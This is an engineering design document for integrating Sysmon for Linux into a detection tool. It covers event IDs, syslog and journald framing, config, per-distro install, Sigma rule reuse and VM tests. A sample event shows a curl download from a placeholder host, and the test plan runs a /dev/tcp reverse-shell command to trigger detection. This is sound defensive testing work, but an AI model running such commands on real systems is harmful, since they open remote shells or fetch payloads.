# Sysmon for Linux as a banken telemetry source

Status: design + scouting, 2026-11-01.

A parser already exists (internal/parser/sysmon.go, internal/parser/sysmon_test.go) and is
registered in parser.Registry() under the source name "sysmon". This doc is the scouting behind it
and the honest reuse verdict. The work still open:

- a config source type
- journald vs syslog landing
- per-distro install
- a VM switch test

Sysmon for Linux is Microsoft Sysinternals' eBPF reimplementation of Windows Sysmon
(github.com/Sysinternals/SysmonForLinux). It emits the same XML event schema as Windows Sysmon, one
event per syslog line, with the same EventData field names (Image, CommandLine, ParentImage,
User, ...). banken already keys its rules and its Event struct on those exact Sigma field names. So
a Linux Sysmon source is cheap, and it is half of a future Windows Sysmon source for free.

It is actively maintained: Sysmon 1.5.3 (2026-09-10, adds aarch64 and Amazon Linux 2023),
SysinternalsEBPF 2.2.2 (2026-09-10), last commit 2026-10-28. This corrects the common assumption
that the Linux port is abandoned. It is not.

## 1. What Sysmon for Linux captures today

Microsoft does not publish an authoritative list of which event IDs the Linux build actually emits.
The README, the repo and the Microsoft Learn page describe it only as "process lifetime, network
connections, file system writes, and more". A repo discussion (microsoft/Sysmon-Linux #193) confirms
the gap. The list below is the set observed in practice and corroborated across sources. Treat it as
empirical, not contractual.

Supported on Linux today (EventID -> type):

- 1   ProcessCreate            - new process, with Image/CommandLine/ParentImage/User/... the bread and butter
- 3   NetworkConnect           - outbound/inbound TCP/UDP connection, with Destination/Source Ip/Port/Hostname
- 4   SysmonServiceStateChanged- Sysmon's own service started/stopped (housekeeping, not host activity)
- 5   ProcessTerminate         - process exit
- 9   RawAccessRead            - raw device read (e.g. reading a block device directly)
- 10  ProcessAccess            - one process opening another (ptrace/mem access shape)
- 11  FileCreate               - file created/overwritten at a watched path
- 16  SysmonConfigStateChanged - Sysmon config (re)loaded (housekeeping)
- 23  FileDelete               - file deleted (archived variant where configured)
- 255 Error                    - Sysmon internal error

Not available on Linux. These are Windows-only, with no OS equivalent, so no event is produced even
if the config asks for it:

- 2 FileCreateTime
- 6 DriverLoad
- 7 ImageLoad
- 8 CreateRemoteThread
- 12/13/14 Registry
- 15 FileCreateStreamHash
- 17/18 NamedPipe
- 19/20/21 WMI
- 22 DnsQuery
- 24 ClipboardChange
- 25 ProcessTampering
- 26 FileDeleteDetected

The full Windows enum (0..26, 255) appears in the config schema and in third-party docs. That is why
stale "supported events" lists overstate Linux. The Windows-only IDs are silently inert on Linux.

Maturity gaps to flag:
- The emitted set is narrower than Windows and the exact set is undocumented. So banken must treat
  "which IDs show up" as discovered at runtime, not relied upon from a table.
- No ImageLoad (7) and no DnsQuery (22) on Linux. Those two carry a lot of Windows Sigma coverage
  (DLL side-loading, suspicious DNS). Their absence is the single biggest reason Windows rule reuse
  is shallower than the shared schema suggests (see section 5).
- Network and file events fire only for paths/filters the config selects. With a bare config you
  mostly get ProcessCreate. The useful telemetry is a function of the config (section 3).

## 2. On-disk output: format, location, framing

Each event is a single line of XML, the Windows Sysmon event shape, namespaced. The structure:

    <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
      <System>... <EventID>1</EventID> ...</System>
      <EventData>
        <Data Name='UtcTime'>2026-11-01 14:33:22.279</Data>
        <Data Name='Image'>/usr/bin/curl</Data>
        ...
      </EventData>
    </Event>

A representative ProcessCreate line follows. It is reconstructed from the documented schema and the
field set the SysmonLogView tool and the SysmonLinux.Util PowerShell module key on. A live capture
carries the same Data Names, with a syslog prefix in front.

    2026-11-01T14:33:22.279123+00:00 host sysmon: <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Linux-Sysmon' Guid='{ff032593-a8d3-4f13-b0d6-01fc615a0f97}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-11-01T14:33:22.279123000Z'/><EventRecordID>12345</EventRecordID><Correlation/><Execution ProcessID='1041' ThreadID='1041'/><Channel>Linux-Sysmon/Operational</Channel><Computer>host</Computer><Security UserId='0'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-11-01 14:33:22.279</Data><Data Name='ProcessGuid'>{a1b2...}</Data><Data Name='ProcessId'>48213</Data><Data Name='Image'>/usr/bin/curl</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>curl http://192.0.2.1/x.sh</Data><Data Name='CurrentDirectory'>/home/alice</Data><Data Name='User'>alice</Data><Data Name='LogonGuid'>{...}</Data><Data Name='LogonId'>1000</Data><Data Name='TerminalSessionId'>3</Data><Data Name='IntegrityLevel'>no level</Data><Data Name='Hashes'>SHA256=...</Data><Data Name='ParentProcessGuid'>{...}</Data><Data Name='ParentProcessId'>2910</Data><Data Name='ParentImage'>/usr/bin/bash</Data><Data Name='ParentCommandLine'>bash</Data><Data Name='ParentUser'>alice</Data></EventData></Event>

Where it lands:
- Sysmon writes via the C syslog() call with identifier "sysmon" (Provider Name 'Linux-Sysmon').
- On distros running rsyslog with a syslog file (Debian, Ubuntu, openSUSE/SLES) the lines land in
  /var/log/syslog (Debian family) or /var/log/messages.
- On distros that are journald-only by default (RHEL/Rocky/Alma, Fedora, Amazon Linux) there is no
  /var/log/syslog. The lines go to the journal, retrievable with `journalctl -t sysmon -o cat`
  (SYSLOG_IDENTIFIER=sysmon). This split is the main deployment subtlety for banken (section 4/6).

A parser must handle the framing. The real line is `<syslog prefix> sysmon: <Event ...>...</Event>`.
rsyslog may escape it or, worse, truncate a very long XML line at its message size limit. The
existing parser already copes. It takes the substring from the first "<Event" to the last "</Event>"
and xml.Unmarshal's that, skipping any line without a well-formed pair. A truncated line simply fails
to unmarshal and is skipped (parser contract: skip what you cannot read, never fail the batch).

Tailing it live is identical to every other banken file source. Open the file, seek the persisted
cursor, follow appends in --watch mode, re-open on rotation. For the journald-only distros banken
reads the journal instead, since it already has a "journald" source type. Sysmon lines then arrive as
plain-text journal messages whose field is the XML, and the same "<Event..</Event>" extraction
applies. Sysmon is a continuous stream, like mimi, not a batch file. So it is a --watch daemon
source, never a one-shot.

## 3. Config model

Sysmon for Linux takes the same XML config/ruleset as Windows Sysmon:

- Install and start with a config: `sudo sysmon -accepteula -i /etc/sysmon/config.xml` (this installs
  and starts sysmon.service). Swap the config live with `sysmon -c /etc/sysmon/config.xml`.
  `sysmon -c` with no file prints the active config. `sysmon -u` uninstalls.
- The config is a tree of per-event <EventFiltering> include/exclude rules. They are keyed on the
  same field names (Image, CommandLine, TargetFilename, DestinationPort, ...) with match conditions
  (is, contains, begin with, end with, image, ...). A RuleName on a matching filter is echoed back
  into the event's <Data Name='RuleName'>, which banken preserves in Raw.
- <FieldSizes> caps field lengths (e.g. `<FieldSizes>CommandLine:100,Image:20</FieldSizes>`). The
  gotcha: a too-small cap truncates CommandLine and silently defeats CommandLine-contains rules.
- Windows-only event groups in a borrowed Windows config (Registry, WMI, ImageLoad, DNS) are inert
  on Linux. Harmless, but they do nothing.

The config is the dial for what banken sees. A permissive config gives banken rich telemetry: log
all ProcessCreate, broad NetworkConnect, FileCreate on sensitive dirs. A tight config starves it.
banken does not own this config. Sysmon does, installed by the operator or the NixOS module. banken's
job is to read whatever Sysmon emits. So ship a reference sysmon-config.xml tuned for the Linux event
set (process + network + FileCreate/FileDelete on /etc, /tmp, /dev/shm, ~/.ssh, cron dirs), rather
than relying on the SwiftOnSecurity Windows config, most of which is inert here.

## 4. Install / deploy per distro

Packages come from Microsoft's package repos (packages.microsoft.com); package name
`sysmonforlinux`, which pulls `sysinternalsebpf` as a dependency. Per the repo INSTALL.md:

- Debian / Ubuntu: add packages-microsoft-prod.deb for the detected release, then
  `apt-get install sysmonforlinux`.
- Fedora: `rpm -Uvh .../config/fedora/$(rpm -E %fedora)/packages-microsoft-prod.rpm`, then install.
- RHEL (and Rocky/Alma, which use the RHEL repo): add packages-microsoft-prod.rpm for the major
  version, then `yum install sysmonforlinux`.
- openSUSE 15 / SLES 15: import the MS key, add prod.repo, `zypper install sysmonforlinux`
  (needs libicu).
- Azure Linux 3: `dnf install sysmonforlinux`.
- Amazon Linux 2023: supported since Sysmon 1.5.3 (2026-09). aarch64 supported since 1.5.3 too.

Arch is not an upstream target (no MS repo); it would need a build-from-source or AUR path - flag
as unsupported-by-upstream for banken's matrix.

Kernel / eBPF requirements:
- A modern eBPF-capable kernel. BTF (CONFIG_DEBUG_INFO_BTF, /sys/kernel/btf/vmlinux) is strongly
  preferred: "On systems that are BTF enabled, Sysmon will use BTF for accurate kernel offsets".
  Without BTF it falls back to best-effort offset discovery, which is fragile. Every banken target
  distro on a current kernel ships BTF, so this is usually fine. It is the same CO-RE/BTF story mimi
  relies on.
- Root and CAP_BPF/CAP_SYS_ADMIN-class privileges to load the probes. Runs as sysmon.service.
- Licensing. SysinternalsEBPF is LGPL2.1, the eBPF code GPL2, and Sysmon itself under the
  Sysinternals EULA (`-accepteula`). It is not in nixpkgs. A NixOS deployment would wrap the MS
  package or build from source.

mimi and Sysmon both use eBPF, and they coexist. They load independent eBPF programs attached to
their own hooks, and the kernel multiplexes many eBPF programs on the same tracepoints/kprobes.
There is no exclusivity. There are costs to note. Two sets of probes means roughly double the
per-syscall overhead and two ring buffers. You will also double-see the same exec, once via mimi and
once via Sysmon. That is fine, and even useful for cross-source corroboration. But banken operators
should pick one as the primary process source per host to avoid duplicate alerts. banken tags each
finding with its data_sources, so de-dup is possible but not free. Running both is mainly a
bench/comparison mode, not a default.

## 5. The strategic question: can banken load Windows-Sysmon Sigma rules unmodified?

At the field level, yes, and banken is already built for exactly this. At the value level, only
partly. The honest payoff is "a meaningful minority of process_creation rules fire as-is", not "the
whole Windows Sysmon corpus for free".

The field level is free for two reasons:
- banken's Event struct and its matcher key on Sigma field names directly (Image, CommandLine,
  ParentImage, TargetFilename, User, CurrentDirectory, ProcessId, ParentProcessId), with no
  per-source translation table. See internal/event/event.go Field().
- Linux Sysmon's EventData Data Names are those same Sigma names. That is the whole point of Sysmon
  keeping the Windows schema. The parser maps them 1:1. Unmapped names (ParentCommandLine, Hashes,
  DestinationIp, OriginalFileName, RuleName, ...) are preserved in Raw, where Event.Field and AllText
  still reach them. So a `category: process_creation` Sigma rule referencing Image / CommandLine /
  ParentImage / ParentCommandLine / User matches a Linux Sysmon ProcessCreate event with zero rule
  edits and no pipeline.

The value level is where reality bites:
- Path shape. Windows Sysmon rules match `Image|endswith: '\\powershell.exe'`, `C:\\Windows\\...`,
  backslash paths, .exe suffixes and drive letters. Linux images are `/usr/bin/...`, forward slashes,
  no extension. Those conditions simply never match on Linux. The rule loads and evaluates, it just
  cannot fire. This is most of the generic Windows process_creation corpus.
- Missing event types. No ImageLoad(7), no DnsQuery(22), no Registry and no WMI on Linux. So every
  Sigma rule whose logsource is image_load / dns_query / registry_* / wmi is dead weight. It will
  never see a matching event regardless of fields.
- logsource gating. SigmaHQ Windows rules declare `logsource: {product: windows, category:
  process_creation}`. banken's win from Sysmon is really the Linux Sigma corpus
  (`product: linux, category: process_creation`). That corpus already uses Image/CommandLine and its
  values are Linux paths, so those fire directly off Sysmon ProcessCreate. The Windows corpus is a
  bonus that mostly applies to behavioural, path-agnostic rules (suspicious CommandLine substrings,
  LOLBin argument patterns that happen to be cross-platform, encoded-command shapes).

The verdict. The shared schema means banken can ingest Windows-Sysmon Sigma rules unmodified without
a field-mapping layer. That part is genuinely free and already true. But treat the practical reuse as
"the Linux Sigma process_creation/network/file rules fire directly, plus a modest slice of
behavioural Windows rules", not as unlocking the full Windows detection library. The field-name
alignment is the real prize, because it also means a future Windows Sysmon source drops into the same
parser and the same rules with almost no new code. Do not oversell Sysmon-for-Linux as "all of
SigmaHQ on Linux".

Separately, banken should still add logsource-aware rule loading so it does not waste cycles
evaluating windows-only / image_load / dns_query rules against a source that can never satisfy them.
That is the "Sigma pipelines / field mappings per logsource" item already on docs/design/standards.md.

## 6. banken integration plan

The parser is done (internal/parser/sysmon.go). It maps a Sysmon event's EventData onto event.Event:

- Image            <- Data Name='Image'
- CommandLine      <- Data Name='CommandLine'
- ParentImage      <- Data Name='ParentImage'
- CurrentDirectory <- Data Name='CurrentDirectory'
- User             <- Data Name='User'
- TargetFilename   <- Data Name='TargetFilename' (FileCreate/FileDelete)
- PID / PPID       <- ProcessId / ParentProcessId (atoi, best-effort)
- Time             <- UtcTime ("2006-01-02 15:04:05.000"), set UTC
- Source           = "sysmon" (stamped by the parser, never read from the line - the enforceSources
  trust rail, same as mimi)
- everything else (ParentCommandLine, Hashes, OriginalFileName, DestinationIp/Port, RuleName,
  ProcessGuid, LogonId, ...) and the EventID -> Raw, so a rule can still reach them via Field/AllText.

Open items the parser alone does not cover:
- ProcessStart. Sysmon carries ProcessGuid and parent GUIDs (which encode a creation timestamp) but
  not a clean start time field. Today ProcessStart stays zero, so response-action pid-reuse-safe
  targeting is weaker off Sysmon than off mimi. Low priority. Note it.
- ParentImage is a real absolute path here, unlike mimi, whose parent is only a comm. So Sysmon gives
  banken proper ParentImage matching, a genuine upgrade over the auditd/mimi sources.
- Consider mapping NetworkConnect's DestinationIp/DestinationPort/DestinationHostname to named
  fields if and when network Sigma rules are in scope. They currently live in Raw, matchable by name.

The config and wiring are open. Add "sysmon" as a config.Source Type. The internal/config/config.go
Source.Type doc currently lists laurel|auditd|journald|syslog, so extend it. There are two shapes,
picked per distro:
- Debian/Ubuntu/openSUSE: `- {type: sysmon, path: /var/log/syslog}` (or /var/log/messages).
- RHEL/Rocky/Alma/Fedora/Amazon: no syslog file, so read the journal. The cleanest option is to let
  the existing journald source carry it (banken already tails the journal) and let the sysmon parser
  do the "<Event..</Event>" extraction on those lines. The alternative is a `path`-less sysmon source
  that means "the journal, identifier sysmon". Decide one. The journald route reuses more.
- A NixOS `services.banken.sysmon.enable` switch, mirroring `services.banken.mimi.enable`. It
  installs/starts sysmon.service with a reference config, points banken at the right source for the
  host's logging backend, and runs banken as a --watch daemon.
- AutoDetectSources could learn to notice sysmon (sysmon.service active and/or lines present) and
  add it. Keep it behind the switch first to avoid double-counting against auditd/mimi.

Streaming and follow. Sysmon is a continuous stream like mimi, so the source is a --watch daemon
input. banken must re-attach across a sysmon.service restart and across log rotation. That is exactly
the failure mode tests/switch-restart.nix already pins for mimi. The file/journal cursor and re-open
logic banken already has covers this. The test must prove it for Sysmon too.

Testing mirrors the mimi switch test:
- tests/sysmon-switch.nix. A NixOS VM with `services.banken.sysmon.enable = true`, audit and mimi
  off, so Sysmon is banken's only source. Install sysmonforlinux (from the MS package or a vendored
  build; needs KVM + BTF, which the VM kernel has), start it with a reference config, and run a
  reverse-shell-shaped `bash -c 'exec 3<>/dev/tcp/192.0.2.1/<port>'` as an unprivileged user. Assert
  banken emits a reverse_shell OCSF Detection Finding tagged data_sources:["sysmon"] within the
  latency budget. This is the same assertion shape as tests/switch.nix. It proves the bytes travelled
  Sysmon -> syslog/journal -> banken.
- A restart variant (tests/sysmon-switch-restart.nix) mirroring switch-restart.nix. Restart
  sysmon.service mid-run and assert banken still alerts off the stream (re-attach).
- Golden fixture. Capture a real Sysmon ProcessCreate/NetworkConnect/FileCreate line from the VM into
  testdata and add it to the parser's golden/table tests. This pins the exact live framing (syslog
  prefix, namespace, truncation behaviour), not just the reconstructed sample in this doc.
- Fuzz target. Add FuzzSysmon alongside the others (the parser-contract no-panic requirement).

## 7. Risks, gotchas, recommendation

Gotchas:
- journald-only distros (RHEL/Rocky/Alma/Fedora/Amazon) have no /var/log/syslog. A naive
  `path: /var/log/syslog` source silently reads nothing. This is the easiest way to deploy banken and
  Sysmon and see zero events. The NixOS switch must choose the journal path on those hosts.
- rsyslog line-length truncation can cut a long CommandLine/XML line. The parser skips an unparseable
  line, so a truncated exec is a dropped detection. Tune rsyslog's $MaxMessageSize or prefer the
  journal.
- <FieldSizes> in the Sysmon config can truncate CommandLine/Image and defeat contains-rules. Ship a
  reference config that does not clip the fields banken matches.
- Undocumented event set. Do not hard-code an assumption that any given EventID is present. The
  parser already degrades gracefully, but detections should not assume e.g. FileDelete is enabled.
- Double-sourcing with mimi/auditd. Two eBPF process sources double the overhead and can
  double-alert. Pick one primary process source per host.
- Supply chain and packaging. sysmonforlinux is a Microsoft binary under the Sysinternals EULA, not
  in nixpkgs. A Nix deployment either wraps the MS package (impure) or builds from source (LGPL/GPL
  eBPF libs). This is real packaging work for the hardened claude/hokkaido environment.
- Privilege. Sysmon needs root + bpf caps and loads kernel probes, the same blast radius as mimi. It
  is another privileged eBPF agent to trust on the host.

Worth it, at low-to-moderate effort, as a complementary source and a credibility play. But scope the
claim honestly. The parser is already written and tested. The remaining work is:

- (a) the config source type + NixOS switch with journald-vs-syslog handling
- (b) a reference Linux Sysmon config
- (c) the VM switch + restart tests and a golden fixture

Call it 1-2 days of integration plus test time, similar in shape to the mimi switch.

The strongest reasons to do it:

- It gives banken a real ParentImage, which auditd and mimi do not.
- It is a second independent process/network/file source for cross-source corroboration.
- The shared Sysmon schema makes a future Windows Sysmon source nearly free on the same parser and
  rules.

Keep repeating the honest caveat. The shared schema lets banken ingest Windows Sigma rules
unmodified. But the bulk of real Linux detection value still comes from the Linux Sigma corpus and a
modest slice of behavioural Windows rules, not from unlocking the entire Windows detection library.

## Sources

- github.com/Sysinternals/SysmonForLinux (README, INSTALL.md; releases: Sysmon 1.5.3 2026-09-10,
  SysinternalsEBPF 2.2.2 2026-09-10; last commit 2026-10-28)
- microsoft/Sysmon-Linux discussion #193 "List of supported Events" (empirical ID list; confirms the
  docs gap)
- learn.microsoft.com/sysinternals/downloads/sysmon (shared schema and field semantics)
- techcommunity.microsoft.com MITRE ATT&CK coverage with Sysmon for Linux (coverage framing)
- darkoperator.com SysmonLinux.Util PowerShell module / PowerShell Gallery (output shape: single-line
  XML to /var/log/syslog, EventData name/value parsing, UtcTime format)
- elastic.co Sysmon for Linux integration (syslog/journal ingest shape)
- Sysmon config schema (Windows enum 0..26,255 vs the Linux-live subset)
